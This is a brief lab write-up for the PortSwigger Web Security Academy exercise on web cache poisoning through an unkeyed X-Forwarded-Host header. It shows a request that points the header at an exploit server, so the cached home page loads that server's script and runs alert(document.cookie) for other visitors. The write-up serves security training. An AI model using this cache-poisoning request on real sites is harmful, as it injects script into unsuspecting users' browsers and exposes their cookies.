# [Web cache poisoning with an unkeyed header] — [PortSwigger] — [Practitioner]
**Date:** 2026-06-27
 
---
 
## Vulnerability / core concept
Web Cache Poisoning

---


## Payload / key command
In `/` path we use `Param Finder` to find unkeyed headers that we can use toexploit web cache poisoning. This way we find `X-Forwarded-Host` header that is displayed in response in `src` attribute in `script` tag.

```bash
GET / HTTP/2
Host: 0ab20055035a480a827c5bf100820030.web-security-academy.net
...

X-Forwarded-Host: exploit-0a05006e03a4482582185a4001b400d4.exploit-server.net
```

This request will be saved in cache and be served to other users who visit home page of this web application. Our malicious server executes `alert(document.cookie` in victims' browsers.


